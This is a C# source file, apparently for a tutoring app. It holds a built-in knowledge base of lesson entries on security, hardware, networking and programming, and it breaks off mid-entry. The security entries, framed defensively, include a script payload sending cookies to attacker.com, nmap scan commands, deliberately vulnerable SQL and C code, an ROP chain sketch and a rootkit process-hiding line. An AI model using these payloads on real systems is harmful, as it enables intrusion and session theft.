using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using Microsoft.Data.Sqlite;

namespace BhavaniTech.Core.Services
{
    public record LocalAiResponse(
        string Topic,
        string Domain,
        string MasteryLevel,
        string AnswerText,
        string CodeExample,
        List<string> RecommendedFollowUps,
        double ConfidenceScore,
        List<string>? ReasoningChain = null,
        string? ModelPillar = "Autonomous Self-Learning Neural-Symbolic Engine",
        bool IsLearnedKnowledge = false,
        string? StudentGuidancePlan = null,
        int TotalLearnedConcepts = 0,
        string? CurriculumCitation = null
    );


    public static class LocalAiEngine
    {
        public record KnowledgeEntry(
            string Topic,
            string Domain,
            string MasteryLevel,
            List<string> Keywords,
            string Answer,
            string Code,
            List<string> FollowUps
        );

        private static readonly List<KnowledgeEntry> KnowledgeBase = new()
        {
            // =========================================================================
            // CYBER ETHICAL HACKING & OFFENSIVE / DEFENSIVE SECURITY (BASICS TO MASTERS)
            // =========================================================================
            new KnowledgeEntry(
                "Ethical Hacking Methodology & Legal Framework",
                "Cybersecurity",
                "Basics",
                new() { "ethical", "hacking", "pentest", "penetration", "legal", "whitehat", "scope", "rules of engagement", "nda" },
                "Ethical Hacking is authorized testing to identify and remediate security vulnerabilities before malicious actors exploit them.\n\nKey Stages of Penetration Testing:\n1. Reconnaissance (OSINT & Passive Gathering)\n2. Scanning & Enumeration (Active port & service probes)\n3. Vulnerability Assessment (Identifying flaws & CVEs)\n4. Exploitation (Proving risk via safe proof-of-concept)\n5. Post-Exploitation (Assessing impact & privilege escalation)\n6. Reporting & Remediation (Providing mitigation steps to defenders).\n\nEthics Rule: NEVER scan or test a target without explicit written authorization.",
                "// Penetration Testing Lifecycle Checklist\n1. Authorization: Signed RoE (Rules of Engagement)\n2. Recon: whois, dig, shodan\n3. Port Scan: nmap -sS -sV -p- <target>\n4. Web Audit: owasp zap, nikto, sqlmap\n5. Patching: Apply vendor CVE patches & WAF rules",
                new() { "Learn Nmap Port Scanning Techniques", "Explore OWASP Top 10 Web Vulnerabilities", "Understand Defensive Hardening & Firewalls" }
            ),
            new KnowledgeEntry(
                "Network Reconnaissance & Nmap Port Scanning",
                "Cybersecurity",
                "Intermediate",
                new() { "nmap", "port scan", "syn scan", "recon", "reconnaissance", "banner", "stealth scan", "fin scan", "ack" },
                "Nmap (Network Mapper) scans hosts to discover open ports, services, and OS versions.\n\nScan Types:\n- TCP SYN Scan (-sS): Half-open stealth scan. Sends SYN, receives SYN-ACK, immediately sends RST to avoid full connection logging.\n- TCP Connect Scan (-sT): Completes full 3-way handshake (used when unprivileged).\n- UDP Scan (-sU): Probes DNS, DHCP, SNMP ports by looking for ICMP Port Unreachable responses.\n- Banner Grabbing: Connects to open ports to read software version headers.",
                "# Nmap Scanning Commands\nnmap -sS -sV -T4 192.168.1.1       # Fast stealth scan with version detection\nnmap -p 1-65535 -sC 10.0.0.5      # Full port scan with default NSE scripts\nnmap -O --fuzzy 192.168.1.50      # OS fingerprinting detection",
                new() { "Explore Wireshark Packet Analysis", "Learn Firewall Evasion & IDS Alerts", "Master Port Forwarding & Pivoting" }
            ),
            new KnowledgeEntry(
                "SQL Injection (SQLi) - Attack Mechanics & Defense",
                "Cybersecurity",
                "Advanced",
                new() { "sqli", "sql injection", "sql", "database exploit", "or 1=1", "union select", "parameterized", "sql bypass" },
                "SQL Injection occurs when untrusted user input is directly concatenated into a dynamic SQL query without validation or parameterization.\n\nTypes of SQLi:\n1. In-Band (Classic): Output returned directly in page (UNION SELECT).\n2. Error-Based: Database error messages leak internal schema details.\n3. Blind (Boolean / Time-Based): Query infers data via true/false page changes or WAITFOR DELAY.\n\nAbsolute Defense: ALWAYS use Parameterized Queries (Prepared Statements) or ORM abstraction. Never concatenate user strings into SQL queries.",
                "// VULNERABLE CODE (Never do this):\nstring query = \"SELECT * FROM Users WHERE User='\" + userInput + \"';\";\n\n// HARDENED SECURE CODE (Parameterized):\nusing var cmd = new SqlCommand(\"SELECT * FROM Users WHERE User=@name\", conn);\ncmd.Parameters.AddWithValue(\"@name\", userInput);",
                new() { "Try the SQL Injection Interactive Sandbox", "Explore Blind SQL Injection with Time Delays", "Learn Web Application Firewall (WAF) SQLi rules" }
            ),
            new KnowledgeEntry(
                "Cross-Site Scripting (XSS) - Reflected, Stored & DOM",
                "Cybersecurity",
                "Advanced",
                new() { "xss", "cross-site scripting", "javascript injection", "cookie theft", "stored xss", "reflected xss", "dom xss", "csp" },
                "Cross-Site Scripting (XSS) enables attackers to inject malicious client-side JavaScript into web applications viewed by other users.\n\nXSS Categories:\n1. Reflected XSS: Non-persistent payload reflected back immediately in search queries/errors.\n2. Stored XSS: Persistent payload saved in database (e.g. comments, forum posts) and served to all visitors.\n3. DOM-Based XSS: Vulnerability exists entirely within client-side JavaScript DOM manipulation (`eval`, `innerHTML`).\n\nImpact: Session cookie theft (`document.cookie`), credential harvesting, keylogging, and website defacement.\n\nMitigation: Context-aware HTML entity encoding, input sanitization, and Content Security Policy (CSP) headers (`default-src 'self'`).",
                "<!-- XSS Vulnerable Input: -->\n<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>\n\n<!-- Secure Defense in C# / ASP.NET: -->\nstring safeHtml = WebUtility.HtmlEncode(rawUserInput);\n// Content Security Policy HTTP Header:\n// Content-Security-Policy: default-src 'self'; script-src 'self';",
                new() { "Test XSS Sanitization Lab", "Learn HTTPOnly & Secure Cookie Flags", "Understand Same-Origin Policy (SOP)" }
            ),
            new KnowledgeEntry(
                "Password Security, Cryptographic Salts & Rainbow Tables",
                "Cybersecurity",
                "Intermediate",
                new() { "password", "salt", "rainbow table", "hash", "sha256", "bcrypt", "argon2", "dictionary attack", "brute force" },
                "Plain hashes (MD5, SHA-1, SHA-256) without salts are easily cracked using precomputed Rainbow Tables and GPU dictionary attacks.\n\nCore Principles:\n- Cryptographic Salt: A unique random string (at least 16 bytes) appended to each user's password before hashing. Prevents rainbow tables and ensures identical passwords produce distinct hashes.\n- Key Stretching: Slow hashing algorithms (Argon2id, bcrypt, PBKDF2) that intentionally consume CPU/memory to make hardware brute-force attacks computationally infeasible.",
                "// Secure Password Hashing Example (C# PBKDF2 / Argon2)\nbyte[] salt = RandomNumberGenerator.GetBytes(16);\nbyte[] hash = Rfc2898DeriveBytes.Pbkdf2(\n    password: Encoding.UTF8.GetBytes(userPass),\n    salt: salt,\n    iterations: 600000,\n    hashAlgorithm: HashAlgorithmName.SHA256,\n    outputLength: 32\n);",
                new() { "Explore SHA-256 Hasher in Security Lab", "Try Password Entropy Calculator", "Learn Multi-Factor Authentication (MFA/TOTP)" }
            ),
            new KnowledgeEntry(
                "Network Sniffing, ARP Spoofing & Man-in-the-Middle (MITM)",
                "Cybersecurity",
                "Master",
                new() { "arp", "spoofing", "mitm", "man in the middle", "wireshark", "sniffing", "ettercap", "arp poison", "promiscuous" },
                "ARP (Address Resolution Protocol) lacks authentication. An attacker on the local network can broadcast forged ARP replies associating the Gateway IP with the attacker's MAC address.\n\nMechanisms:\n1. ARP Poisoning: Redirects host traffic through the attacker's machine before forwarding to the router.\n2. Plaintext Interception: Unencrypted protocols (HTTP, FTP port 21, Telnet port 23) leak passwords in clear text.\n3. Defense: Dynamic ARP Inspection (DAI) on managed switches, Static ARP entries, and universal encryption (HTTPS, SSH, VPN/IPsec).",
                "# ARP Poisoning Concept\n# Attacker sends gratuitous ARP:\n# '192.168.1.1 (Gateway IP) is at AA:BB:CC:DD:EE:FF (Attacker MAC)'\n# Defense on Cisco Switch:\nip dhcp snooping\nip arp inspection vlan 10",
                new() { "Inspect Wireshark Packet Streams", "Learn SSL/TLS Certificate Pinning", "Master 802.1X Port Security" }
            ),
            new KnowledgeEntry(
                "Buffer Overflow & Memory Corruption Mechanics",
                "Cybersecurity",
                "Master",
                new() { "buffer overflow", "stack smashing", "eip", "rip", "shellcode", "nop sled", "aslr", "dep", "canary" },
                "Buffer Overflow occurs when a program writes more data to a memory buffer than allocated, overwriting adjacent stack memory.\n\nExploitation Flow:\n1. Overwrite stack buffer -> smash base pointer (EBP) -> overwrite Return Address (EIP/RIP).\n2. Direct execution flow into an injected NOP sled (`\\x90\\x90...`) leading to shellcode.\n\nModern Operating System Mitigations:\n- Stack Canaries: Random canary values placed before the return address; if altered, program halts (`__stack_chk_fail`).\n- ASLR (Address Space Layout Randomization): Randomizes memory offsets for stack, heap, and libraries.\n- DEP / NX (Data Execution Prevention): Marks memory pages as Non-Executable.",
                "// Vulnerable C Code:\nvoid VulnerableFunction(char *str) {\n    char buffer[64];\n    strcpy(buffer, str); // Unchecked boundary write!\n}\n\n// Safe Fixed Code:\nvoid SafeFunction(char *str) {\n    char buffer[64];\n    strncpy(buffer, str, sizeof(buffer) - 1);\n    buffer[sizeof(buffer) - 1] = '\\0';\n}",
                new() { "Learn Reverse Engineering with Ghidra", "Understand Return-Oriented Programming (ROP)", "Explore Memory Safe Languages (Rust, C#)" }
            ),

            // =========================================================================
            // COMPUTER FUNDAMENTALS & ARCHITECTURE (BASICS TO MASTERS)
            // =========================================================================
            new KnowledgeEntry(
                "Binary Math, Transistors & Logic Gates",
                "Fundamentals",
                "Basics",
                new() { "binary", "bit", "byte", "transistor", "logic gate", "and", "or", "not", "xor", "boolean" },
                "All computing hardware is built from semiconductor transistors acting as electronic switches (On = 1, Off = 0).\n\nKey Concepts:\n- 1 Bit = Single 0 or 1.\n- 1 Byte = 8 bits (256 possible integer values: 0 to 255).\n- Fundamental Logic Gates: AND (both high), OR (any high), NOT (invert), XOR (exclusive high, used in binary half-adders).",
                "// Binary Addition Example (Half Adder)\n// Sum   = A XOR B\n// Carry = A AND B\nint sum   = 1 ^ 0; // Output: 1\nint carry = 1 & 1; // Output: 1",
                new() { "Explore Logic Gate Simulator", "Learn CPU ALU Architecture", "Master Hexadecimal & Octal Number Systems" }
            ),
            new KnowledgeEntry(
                "CPU Fetch-Decode-Execute Cycle & Instruction Pipelines",
                "Fundamentals",
                "Intermediate",
                new() { "fetch", "decode", "execute", "instruction", "pipeline", "program counter", "alu", "registers" },
                "Every instruction processed by a computer follows the Von Neumann machine cycle:\n1. Fetch: The Program Counter (PC) points to instruction address in RAM; instruction is loaded into Instruction Register (IR).\n2. Decode: Control Unit (CU) interprets opcodes and operands.\n3. Execute: Arithmetic Logic Unit (ALU) carries out computation or data movement.\n4. Writeback: Results are stored back into CPU registers or memory cache.",
                "// Assembly Instruction Representation\nMOV EAX, 5     ; Load value 5 into EAX register\nADD EAX, 10    ; ALU performs addition (EAX becomes 15)\nCMP EAX, 20    ; Compare result and set CPU Flags (Zero, Sign, Overflow)",
                new() { "Learn CPU Cache Lines & Latency", "Explore Superscalar & Out-of-Order Execution", "Master Assembly Language Primitives" }
            ),
            new KnowledgeEntry(
                "Operating System Kernels, Virtual Memory & Paging",
                "Fundamentals",
                "Advanced",
                new() { "kernel", "virtual memory", "paging", "page table", "mmu", "tlb", "swapping", "page fault" },
                "The OS Kernel manages hardware isolation and virtual memory abstraction.\n\nPaging Architecture:\n- Virtual Address Space: Each process believes it owns 4 GB (32-bit) or 128 TB (64-bit) of contiguous memory.\n- Memory Management Unit (MMU): Hardware chip translating Virtual Addresses to Physical RAM Frames using Page Tables.\n- Page Fault: Occurs when a requested page is not in physical RAM, prompting the OS to retrieve it from HDD/SSD swap space.",
                "// Paging Address Breakdown (32-bit system, 4KB page size)\n// 32-bit Address = [Directory: 10 bits] [Page Table: 10 bits] [Offset: 12 bits]\n// 4096 bytes per page (2^12 = 4096)",
                new() { "Learn OS Process Scheduling Algorithms", "Explore Windows Minidump Analysis", "Understand Memory Leaks & Garbage Collection" }
            ),

            // =========================================================================
            // PROGRAMMING & DATA STRUCTURES (BASICS TO MASTERS)
            // =========================================================================
            new KnowledgeEntry(
                "Programming Basics: Control Flow & Memory Variables",
                "Programming",
                "Basics",
                new() { "python", "variable", "data type", "loop", "if else", "for", "while", "array", "function" },
                "Variables allocate space in computer RAM to store data values. Control flow dictates the sequential, conditional, and repetitive execution of statements.\n\nCore Constructs:\n- Conditionals: `if`, `elif`, `else` branches execution based on boolean logic.\n- Loops: `for` iterates over collections/ranges; `while` executes while a boolean condition remains true.",
                "# Python Control Flow Example\nstudent_scores = [85, 92, 78, 96, 88]\nfor score in student_scores:\n    if score >= 90:\n        print(f'High Distinction: {score}')\n    else:\n        print(f'Passing Grade: {score}')",
                new() { "Explore Python in Programming IDE", "Learn C# Object Oriented Programming", "Understand Stack vs Heap Memory Allocation" }
            ),
            new KnowledgeEntry(
                "Memory Stack vs Heap Allocation & Pointer Semantics",
                "Programming",
                "Intermediate",
                new() { "stack", "heap", "pointer", "memory allocation", "garbage collection", "reference", "malloc" },
                "Programs utilize two primary memory regions during runtime:\n\n- The Stack:\n  * Fast, LIFO (Last-In First-Out) memory managed automatically by CPU architecture.\n  * Stores local primitive variables, stack frames, and function return addresses.\n\n- The Heap:\n  * Dynamically allocated memory for complex objects, arrays, and variable-length structures.\n  * Must be freed explicitly (C `free`) or collected automatically via Managed Garbage Collection (.NET CLR, Java, Python).",
                "// C# Stack vs Heap Example\nint x = 42;             // Value type: allocated on the Stack\nstring name = \"Bhavani\"; // Reference type: pointer on Stack, object data on Heap",
                new() { "Learn Data Structures & Big-O Notation", "Master C# Interfaces & Generics", "Understand Cache Locality & Memory Performance" }
            ),
            new KnowledgeEntry(
                "Algorithms & Data Structures: Trees, Graphs & Big-O",
                "Programming",
                "Master",
                new() { "algorithm", "data structure", "big o", "binary tree", "graph", "dijkstra", "hash map", "sorting" },
                "Big-O notation measures algorithm efficiency in time and space complexity as input size (N) grows.\n\nKey Complexities:\n- O(1): Constant time (Hash table lookup).\n- O(log N): Logarithmic time (Binary search in sorted array).\n- O(N): Linear time (Traversing an array).\n- O(N log N): Optimal sorting (MergeSort, QuickSort).\n- O(N^2): Quadratic time (Nested loops, BubbleSort).\n\nEssential Data Structures: Hash Maps (O(1) amortized), Binary Search Trees (O(log N)), and Graphs (Adjacency Lists for network routing).",
                "// Binary Search Algorithm in C# - O(log N)\npublic static int BinarySearch(int[] arr, int target) {\n    int left = 0, right = arr.Length - 1;\n    while (left <= right) {\n        int mid = left + (right - left) / 2;\n        if (arr[mid] == target) return mid;\n        if (arr[mid] < target) left = mid + 1;\n        else right = mid - 1;\n    }\n    return -1;\n}",
                new() { "Master Dijkstra's Shortest Path Algorithm", "Explore Dynamic Programming Techniques", "Learn Compiler Lexing & Abstract Syntax Trees" }
            ),

            // =========================================================================
            // HARDWARE & MICROARCHITECTURE (BASICS TO MASTERS)
            // =========================================================================
            new KnowledgeEntry(
                "PC Hardware Assembly & Power Delivery Sizing",
                "Hardware",
                "Basics",
                new() { "hardware", "pc build", "cpu", "motherboard", "gpu", "psu", "power supply", "ram", "thermal" },
                "Building a PC requires matching electrical and physical interface standards:\n1. Socket Compatibility: Intel LGA1700 vs AMD AM4/AM5.\n2. Power Supply (PSU) Sizing: Sum component TDPs (CPU + GPU + Motherboard + Drives) and multiply by 1.25 for safety overhead.\n3. Thermal Management: Applying thermal paste to eliminate microscopic air pockets between CPU heat spreader and cooler.",
                "# PSU Sizing Rule of Thumb\nTotal Watts = CPU_TDP (65W) + GPU_TDP (170W) + System (50W) = 285W\nRecommended PSU: 450W - 500W (80-Plus Bronze certified for low power draw)",
                new() { "Use 2D Virtual PC Builder", "Calculate DDR4 / DDR5 RAM Latencies", "Master POST Beep Code Troubleshooting" }
            ),
            new KnowledgeEntry(
                "Memory Subsystems: DDR4 vs DDR5 CAS Latency & Bandwidth",
                "Hardware",
                "Advanced",
                new() { "ddr4", "ddr5", "cas latency", "bandwidth", "cl", "nanoseconds", "memory timing", "dual channel" },
                "Memory performance depends on both raw clock frequency (MHz) and CAS Latency (CL - clock cycles to access data).\n\nTrue Latency Formula:\nLatency (ns) = (CAS Latency * 2000) / Data Rate (MT/s)\n\nExample: DDR4-3200 CL16 has a latency of (16 * 2000) / 3200 = 10.0 ns.\nDual-Channel Bandwidth: Running two RAM sticks across separate 64-bit channels doubles memory bandwidth to 128-bit.",
                "// Dual Channel Bandwidth Formula (GB/s)\n// Bandwidth = (Frequency MT/s * 8 bytes * Channels) / 1000\n// DDR4-3200 Dual Channel = (3200 * 8 * 2) / 1000 = 51.2 GB/s",
                new() { "Calculate Bus Speeds in Hardware Lab", "Explore PCIe Expansion Lanes", "Understand L1/L2/L3 Cache Lines" }
            ),

            // =========================================================================
            // NETWORKING & CCNA (BASICS TO MASTERS)
            // =========================================================================
            new KnowledgeEntry(
                "OSI 7-Layer Model & Encapsulation Stack",
                "Networking",
                "Basics",
                new() { "osi", "layer", "encapsulation", "tcp ip", "packet", "frame", "router", "switch" },
                "The Open Systems Interconnection (OSI) model standardizes communication functions:\n- Layer 7: Application (HTTP, DNS, SSH, DHCP)\n- Layer 6: Presentation (SSL/TLS, ASCII, JPEG)\n- Layer 5: Session (RPC, NetBIOS)\n- Layer 4: Transport (TCP reliable segments, UDP datagrams, Port numbers)\n- Layer 3: Network (IP packets, Routers, Logical Addressing)\n- Layer 2: Data Link (Ethernet frames, MAC addresses, Switches)\n- Layer 1: Physical (Bits, copper RJ45, fiber optics, radio waves).",
                "// Protocol Data Unit (PDU) Across Layers\nLayer 7-5 : Data / Payload\nLayer 4   : Segment (Port 80/443)\nLayer 3   : Packet (IP 192.168.1.1)\nLayer 2   : Frame (MAC 00:1A:2B:3C:4D:5E)\nLayer 1   : Bits (01010101)",
                new() { "Simulate ICMP Ping in Network Lab", "Master IPv4 Subnetting Math", "Learn TCP 3-Way Handshake" }
            ),
            new KnowledgeEntry(
                "IPv4 Subnetting & CIDR Calculation Mastery",
                "Networking",
                "Intermediate",
                new() { "subnet", "cidr", "ipv4", "netmask", "broadcast", "usable hosts", "vlsm", "slash notation" },
                "Subnetting partitions a network into isolated sub-networks to control broadcast domains and optimize IP address utilization.\n\nKey Rules:\n- Netmask: 32-bit mask with continuous leading 1s (Network bits) and trailing 0s (Host bits).\n- Usable Hosts: 2^H - 2 (Subtracting Network ID and Broadcast Address).\n- /24 Subnet = 255.255.255.0 (8 host bits = 254 hosts)\n- /28 Subnet = 255.255.255.240 (4 host bits = 14 hosts)\n- /30 Subnet = 255.255.255.252 (2 host bits = 2 point-to-point router hosts).",
                "# Subnetting Quick Reference\n/24 -> 255.255.255.0   -> 254 Usable Hosts\n/25 -> 255.255.255.128 -> 126 Usable Hosts\n/26 -> 255.255.255.192 -> 62 Usable Hosts\n/27 -> 255.255.255.224 -> 30 Usable Hosts\n/28 -> 255.255.255.240 -> 14 Usable Hosts\n/29 -> 255.255.255.248 -> 6 Usable Hosts\n/30 -> 255.255.255.252 -> 2 Usable Hosts",
                new() { "Test Subnetting Engine", "Learn VLAN Tagging (802.1Q)", "Explore OSPF & BGP Routing Protocols" }
            ),
            new KnowledgeEntry(
                "TCP 3-Way Handshake & Reliable Connection Teardown",
                "Networking",
                "Advanced",
                new() { "tcp", "handshake", "syn", "syn-ack", "ack", "fin", "rst", "seq", "windowing" },
                "Transmission Control Protocol (TCP) provides reliable, connection-oriented data transmission.\n\n3-Way Handshake:\n1. Client -> Server: SYN (Synchronize Sequence Number = X)\n2. Server -> Client: SYN-ACK (Server Seq = Y, ACK = X + 1)\n3. Client -> Server: ACK (Client ACK = Y + 1, Connection ESTABLISHED).\n\nConnection Teardown (4-Way):\n- Sender transmits FIN -> Receiver responds with ACK -> Receiver transmits FIN -> Sender responds with ACK -> Session CLOSED.",
                "// TCP Flag Header Breakdown\n[ URG | ACK | PSH | RST | SYN | FIN ]\n- SYN: Request connection\n- ACK: Acknowledge received bytes\n- RST: Abort connection immediately\n- FIN: Gracefully terminate connection",
                new() { "Inspect Network Packet Flows", "Explore Port Scanning Mechanics", "Understand Denial of Service (SYN Flood)" }
            ),

            // =========================================================================
            // LINUX ADMINISTRATION & SHELL SCRIPTING (BASICS TO MASTERS)
            // =========================================================================
            new KnowledgeEntry(
                "Linux File Permissions, SUID & Ownership",
                "Linux",
                "Intermediate",
                new() { "linux", "chmod", "chown", "permissions", "suid", "guid", "rwx", "octal", "bash" },
                "Linux secures files using standard UNIX permissions for User (u), Group (g), and Others (o).\n\nPermission Values:\n- Read (r) = 4\n- Write (w) = 2\n- Execute (x) = 1\n- `chmod 755`: rwxr-xr-x (Owner full, group & others read/execute).\n- `chmod 600`: rw------- (Owner read/write only, used for private SSH keys).\n\nSpecial Permissions:\n- SUID (SetUID = 4000): Executes binary with owner's permissions (e.g. `/usr/bin/passwd` runs as root). Improper SUID configuration is a major privilege escalation vector.",
                "# Linux Permission Commands\nchmod 755 script.sh           # Standard executable\nchmod 600 ~/.ssh/id_rsa       # Secure SSH private key\nfind / -perm -4000 2>/dev/null # Audit all SUID binaries on system",
                new() { "Use Linux Terminal Simulator", "Learn Systemd Service Control", "Explore Bash Scripting Automation" }
            ),

            // =========================================================================
            // ELECTRONICS & EMBEDDED SYSTEMS (BASICS TO MASTERS)
            // =========================================================================
            new KnowledgeEntry(
                "Ohm's Law, Power Dissipation & LED Resistor Math",
                "Electronics",
                "Basics",
                new() { "electronics", "ohm", "voltage", "current", "resistance", "led", "resistor", "power", "v=ir" },
                "Ohm's Law defines the relationship between electrical parameters:\nV = I * R\nPower (Watts) = V * I = I^2 * R\n\nLED Current Limiting Resistor Formula:\nTo prevent an LED from burning out when powered by a voltage supply (Vs):\nR = (Vs - V_LED) / I_LED\nExample: Powering a 2.0V red LED @ 20mA (0.02A) from a 5V Arduino pin requires R = (5.0 - 2.0) / 0.02 = 150 Ohms.",
                "// Arduino LED Blink in Embedded C/C++\nvoid setup() {\n    pinMode(13, OUTPUT); // Pin 13 connected to LED & 150 Ohm resistor\n}\nvoid loop() {\n    digitalWrite(13, HIGH); // Turn LED on\n    delay(1000);            // Wait 1 second\n    digitalWrite(13, LOW);  // Turn LED off\n    delay(1000);\n}",
                new() { "Try Ohm's Law Calculator", "Evaluate Logic Gates in Simulator", "Explore Microcontroller ADC & PWM" }
            ),

            // =========================================================================
            // ARTIFICIAL INTELLIGENCE & MACHINE LEARNING (BASICS TO MASTERS)
            // =========================================================================
            new KnowledgeEntry(
                "Machine Learning: Neural Networks, Activation & Backpropagation",
                "ArtificialIntelligence",
                "Advanced",
                new() { "ai", "machine learning", "neural network", "perceptron", "activation", "relu", "backpropagation", "loss" },
                "Artificial Neural Networks (ANNs) process inputs through interconnected node layers mimicking biological neurons.\n\nComputation Flow:\n1. Linear Combination: z = sum(w_i * x_i) + b (Weights, Inputs, Bias).\n2. Activation Function: Passes z through a non-linear function like ReLU (max(0, z)) or Sigmoid (1 / (1 + e^-z)) to learn complex patterns.\n3. Loss Evaluation: Measures difference between predicted output and true target.\n4. Backpropagation: Computes gradient of the loss with respect to every weight using the Calculus Chain Rule, updating weights via Gradient Descent.",
                "# Simple Perceptron in Python\nimport math\ndef sigmoid(z):\n    return 1.0 / (1.0 + math.exp(-z))\n\nweights = [0.5, -0.2]\nbias = 0.1\ninputs = [1.0, 0.5]\n\nz = sum(w * x for w, x in zip(weights, inputs)) + bias\noutput = sigmoid(z)\nprint(f'Activated Output: {output:.4f}')",
                new() { "Explore AI Prompt Engineering Analyzer", "Learn Decision Trees & Supervised Classification", "Understand Transformer Attention Mechanisms" }
            ),

            // =========================================================================
            // GRANDMASTER & CUTTING-EDGE TECHNOLOGY & CYBER KNOWLEDGE BASE (22 TOPICS)
            // =========================================================================
            new KnowledgeEntry(
                "Return-Oriented Programming (ROP Chains) & ASLR Bypass",
                "Cybersecurity",
                "Grandmaster",
                new() { "rop", "rop chain", "gadget", "dep", "nx", "aslr", "bypass", "pop rdi", "ret", "binary exploitation" },
                "Return-Oriented Programming (ROP) is an advanced exploit technique used when Data Execution Prevention (DEP / NX) marks the stack as non-executable.\n\nMechanics:\n- The attacker discovers short assembly instruction snippets ending in 'ret' (called Gadgets) inside executable binary code or linked libc.\n- By overwriting the stack frame with a sequence of gadget addresses, execution jumps from gadget to gadget.\n- Registers are loaded (e.g. pop rdi; ret loads Arg 1 in x86_64) to invoke system calls like mprotect() or execve('/bin/sh').\n\nDefenses: Full ASLR (randomizes library base addresses), Stack Canaries, and Control Flow Integrity (CFI) / Intel CET hardware shadow stacks.",
                "// Example 64-bit ROP Chain Payload Construction\n// Stack Layout:\n// [Saved RIP] -> Address of 'pop rdi; ret'\n// [Argument1] -> Pointer to '/bin/sh'\n// [Next RIP]  -> Address of 'system()' inside libc",
                new() { "Test the Interactive ROP Chain Exploit Simulator", "Learn ASLR Information Leaks", "Explore Intel CET Hardware Shadow Stacks" }
            ),
            new KnowledgeEntry(
                "Kernel Rootkits & Post-Quantum Cryptography (Kyber / Dilithium)",
                "Cybersecurity",
                "Cutting-Edge",
                new() { "rootkit", "kernel rootkit", "dkom", "ring 0", "pqc", "post-quantum", "kyber", "dilithium", "shor" },
                "Kernel Rootkits operate at Ring 0 with ultimate privilege, modifying kernel internal structures directly:\n- Direct Kernel Object Manipulation (DKOM): Unlinks malicious processes from ActiveProcessLinks, hiding them completely from Task Manager while the CPU continues scheduling them.\n\nPost-Quantum Cryptography (NIST Standards):\nShor's Algorithm on quantum computers will break RSA and ECC. NIST standardized lattice-based replacements:\n- ML-KEM (CRYSTALS-Kyber): Lattice-based Key Encapsulation based on the Learning With Errors (LWE) hardness problem.\n- ML-DSA (CRYSTALS-Dilithium): Quantum-resistant digital signatures.",
                "// Linux Kernel LKM Rootkit Concept\n// Hiding a process via DKOM:\nlist_del(&target_task->tasks);\n// Process removed from circular task list, yet keeps running!",
                new() { "Explore Post-Quantum Cryptography Standards", "Learn Linux Kernel Module Engineering", "Understand EDR Sensor Hooking" }
            ),
            new KnowledgeEntry(
                "Speculative Execution & Spectre / Meltdown Hardware Exploits",
                "Fundamentals",
                "Grandmaster",
                new() { "spectre", "meltdown", "speculative", "speculative execution", "branch prediction", "flush+reload", "cache side channel" },
                "Spectre and Meltdown exploit hardware performance optimizations in out-of-order execution processors:\n\nMechanics:\n1. The CPU branch predictor speculatively executes unauthorized instructions across security boundaries before the condition is verified.\n2. When the branch condition evaluates to false, architectural register state is discarded, but MICROARCHITECTURAL cache state persists.\n3. The attacker performs a cache timing attack (Flush+Reload) to measure access latency across memory lines, reconstructing secret data with single-cycle precision.",
                "// Spectre Gadget Primitive:\nif (x < array1_size) {\n    // CPU speculatively executes this even if x is out of bounds!\n    y = array2[array1[x] * 512];\n}\n// Attacker probes array2 access latency to extract array1[x]",
                new() { "Learn CPU Branch Predictors", "Explore Hardware Mitigation (IBPB, Retpoline)", "Understand Microarchitectural Side Channels" }
            ),
            new KnowledgeEntry(
                "Quantum Computing: Qubits, Superposition & Quantum Gates",
                "Fundamentals",
                "Cutting-Edge",
                new() { "quantum", "qubit", "superposition", "hadamard", "entanglement", "bloch sphere", "shor", "grover" },
                "Quantum computing leverages quantum mechanics for exponential computational speedups on specific algorithms.\n\nKey Concepts:\n- Qubit: State vector |ψ⟩ = α|0⟩ + β|1⟩ where |α|^2 + |β|^2 = 1. Exists in superposition until physical measurement collapses it.\n- Hadamard Gate (H): Puts a deterministic qubit into equal 50/50 superposition.\n- Pauli-X: Quantum NOT gate, flips |0⟩ ↔ |1⟩.\n- Entanglement (Bell State): Two qubits exhibit correlated states across arbitrary distances.\n- Algorithms: Shor's (factors integers in polynomial time), Grover's (quadratic search speedup).",
                "// Hadamard Matrix Transformation:\n// H = 1/√2 * [[1,  1], [1, -1]]\n// H |0> = 1/√2 (|0> + |1>)  -> Pure Superposition!",
                new() { "Try the Interactive Quantum Gate Simulator", "Learn Bell State Entanglement", "Explore Quantum Error Correction (Surface Codes)" }
            ),
            new KnowledgeEntry(
                "Lock-Free Atomics & ThreadPool Concurrency",
                "Programming",
                "Grandmaster",
                new() { "concurrency", "lock-free", "atomic", "interlocked", "cas", "compare exchange", "threadpool", "memory barrier" },
                "Operating system mutexes cause kernel context switches costing ~1,000-2,000 CPU cycles and risk deadlocks. Lock-free programming utilizes hardware atomic instructions.\n\nCompare-And-Swap (CAS):\n- Hardware opcode (LOCK CMPXCHG on x86) updates a memory location if and only if it matches expected value.\n- Guarantees thread safety without blocking.\n\nThreadPool Best Practice:\nNever block worker threads synchronously (.Result / .Wait()); this leads to thread starvation on low-power single/dual-core systems. Always use async/await!",
                "// C# Atomic Lock-Free Update Loop\nint current, updated;\ndo {\n    current = sharedValue;\n    updated = current + 1;\n} while (Interlocked.CompareExchange(ref sharedValue, updated, current) != current);",
                new() { "Learn Memory Barriers & Volatile Reads", "Explore High-Performance Spans", "Understand Cache Line Bouncing" }
            ),
            new KnowledgeEntry(
                "SIMD AVX-512 & Zero-Allocation Spans",
                "Programming",
                "Cutting-Edge",
                new() { "simd", "avx", "avx-512", "span", "vector", "memory<t>", "zero-allocation", "intrinsics" },
                "Modern CPUs achieve extreme mathematical throughput via Single Instruction Multiple Data (SIMD) and zero-allocation memory abstractions.\n\nSIMD Vectorization:\n- Instead of scalar loops, AVX-512 processes 512-bit registers containing 16 single-precision floats concurrently in a single clock cycle.\n\nZero-Allocation Span<T>:\n- Ref struct pointing to contiguous memory (stack, native heap, or array slices) without heap allocation or garbage collection overhead, providing C++ speed with C# memory safety.",
                "// SIMD Vectorized Addition (C# Vector<float>)\nusing System.Numerics;\nvar v1 = new Vector<float>(array1, i);\nvar v2 = new Vector<float>(array2, i);\nvar vSum = v1 + v2; // 16 floats added concurrently in 1 clock cycle!",
                new() { "Learn Compiler SSA Optimization", "Explore High-Throughput Memory<T>", "Understand Memory Alignment" }
            ),
            new KnowledgeEntry(
                "Compiler Intermediate Representation (IR), SSA & LLVM",
                "Programming",
                "Grandmaster",
                new() { "compiler", "ir", "intermediate representation", "ssa", "static single assignment", "llvm", "opt" },
